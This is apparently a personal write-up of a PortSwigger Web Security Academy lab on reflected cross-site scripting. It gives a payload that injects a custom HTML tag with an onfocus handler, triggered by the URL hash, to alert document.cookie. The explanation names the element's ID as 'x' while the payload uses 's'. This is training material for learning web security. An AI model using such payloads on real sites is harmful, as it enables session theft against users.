This lab blocks all HTML tags except custom ones.

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that injects a custom tag and automatically alerts `document.cookie`.

# Exploitation

Follow a similar process as in [[Reflected XSS into HTML context with most tags and attributes blocked]]

Start by injection a custom HTML tag:


```HTML
<script>
location = "https://0adc0090043cc6828167dea500eb003d.web-security-academy.net/?search=<custom+id%3ds+onfocus%3dalert(document.cookie)+tabindex%3d1>#s";
</script>
```

This payload works because:

This injection creates a custom tag with the ID `x`, which contains an `onfocus` event handler that triggers the `alert` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the `alert` payload to be called.